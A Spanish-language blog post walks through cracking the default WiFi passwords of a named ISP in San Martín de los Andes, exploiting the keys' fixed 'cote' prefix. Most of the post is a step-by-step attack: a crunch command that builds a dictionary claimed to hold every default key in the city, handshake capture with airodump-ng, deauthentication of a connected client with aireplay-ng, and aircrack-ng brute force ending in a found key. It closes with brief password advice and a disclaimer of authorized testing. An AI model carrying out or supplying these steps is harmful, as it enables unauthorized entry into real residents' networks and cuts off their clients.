---
title: "WiFi Cooperativo en la aldea de montaña"
date: 2021-01-13T00:00:00-03:00
author: "bronxi"

draft: false

tags: ["wifi","aircrack","brute force"]
categories: ["wifi","brute foce"]
featuredImage: "/images/wifialdea/wifipass.png"
lightgallery: true

---


# WiFi Cooperativo en la aldea de montaña

Pasé tres semanas en San Martín de los Andes y noté que las claves WiFi por defecto del único proveedor de Internet tienen un patrón sumamente sencillo. Poseen 8 dígitos y todas comienzan con los mismos cuatro caracteres y los últimos 4 son alfanuméricos aleatorios. Por lo que existen solamente 1679616 posibilidas. Para generar un diccionario con dichas líneas, utilizaré la herramienta crunch.

## Instalar crunch & dictionary
Pueden intalarla en cualquier distribución Debian con el siguiente comando (Kali ya lo trae):

> sudo apt-get install -y crunch


El comando para crear este diccionario es muy sencillo

> crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -t cote@@@@ -o cotexxxx.txt

El primer 8 es el mínimo de caracteres de las claves y el segundo 8 el máximo de caracteres. Aquí solo necesitamos claves de 8 caracteres.
El string "abcdefghijklmnopqrstuvwxyz0123456789" que le sigue determina los caracteres a utilizar para la porción aleatoria de las claves.
La opción "-t" especifica un patrón para los caracteres aleatorios. En este caso es @, que se trata de minúsculas y también tomará los números que hemos indicado anteriormente. A esto le sigue la estructura del patrón "cote@@@@". Las @s serán los caracteres reemplazados por todas las variantes de la a a la z y del 0 al 9.
La opción "-o" indica la salida. Nombramos el archivo como nos guste.

### __Podemos decir que este diccionario contiene todas las claves por defecto de la ciudad__ ###


El siguiente paso es conseguir el archivo que contenga el handshake cifrado de la red WiFi. Para ello utilizamos aircrack-ng.

## Instalar aircrack
Para instalarlo en cualquier versión Debian (Kali también lo trae):

> sudo apt install aircrack-ng

## Our WiFi Interface

Nos fijamos el nombre de nuestra placa con ifconfig

> ifconfig
> wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.38  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fa80::4g23:98l6:ka0:3436  prefixlen 64  scopeid 0x20<link>
        ether 59:96:1b:95:b0:2d  txqueuelen 1000  (Ethernet)
        RX packets 275495  bytes 308923532 (308.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 103650  bytes 21966607 (21.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


Antes de comenzar realizamos un check kill para evitar cualquier conflicto.

> sudo airmon-ng check kill


## Monitor Mode

Luego ponemos nuestra placa wifi en modo monitos:

> sudo airmon-ng start wlan0

## Redes WiFi en nuestro aire
Escaneamos las redes:

> sudo airodump-ng start wlan0mon

## Escuchando por un handshake
Una vez elegido el accesspoint al que queremos acceder, con ctrl + c detenemos el escaneo y nos pondremos a la escucha del accesspoint seleccionado:

> sudo airodump-ng -c 6 -b 00:01:12:56:32:56 -w nombredelarchivocondatosescuchados wlan0mon

Acá "-w" indica el nombre del archivo en el que se guardarán los datos capturados. "-c" indica en canal por el que trabaja el accesspoint. "-b" indica la MAC del accesspoint (BSSID). Por último, la interface que usamos, en este caso "wlan0mon". Al darle enter comenzará a escuchar ese accesspoint.

Veremos la cantidad de paquetes capturados y perdidos. En al parte inferior de la terminal, se observan los clientes conectados al accesspoint, elegimos uno para deantenticar y obtener el handshake (paquete que contiene la clave WiFi encriptada).

## Deaunenticar al cliente
Mientras el proceso anterior continúa corriendo, en otra terminal realizamos una deautenticación del cliente con los datos copiados. Es decir, del BSSID (accesspoint) y de una STATION (cliente).

> aireplay-ng -0 10 -a 00:01:12:56:32:56 -c 00:00:10:A0:05:06 wlan0mon

Acá "-0" indica la orden deauntenticar. "-a" la MAC del accesspoint. "-c" la MAC del cliente a deauntenticar. Por último, la interfaz que utilizamos en modo monitor, en este caso "wlan0mon".

Al conseguir el handshake, se notificará en la terminal que está escuchando, abierta en el punto *Escuchando por un handshake* Se obersva el mensaje en la parte superior derecha.

Verán algo así:

![Handshake](/images/wifialdea/handshake.png "Handshake")

## Brute force final
Por último, utilizamos fuerza bruta para probar todas las claves del diccionario sobre el archivo que contiene el handshake con el siguiente comando:

> sudo aircrack-ng -w cotexxxx.txt -b 00:01:12:56:32:56 nombredelarchivocondatosescuchados.cap

> KEY FOUND! [ cotefr33 ]

## Recomendaciones:
- Generar claves de diez caracteres en la que todos sus caracteres sean aleatorios.
- Si sos user, cambiá tu clave por defecto.


*Esta prueba se realizó en un entorno controlado con los permisos de los clientes adjudicatarios de los dispositivos involucrados, con el fin único de reconocer el nivel de seguridad de acceso a los dispositivos wifi desde una perspectiva ética de investigación en InfoSec.*
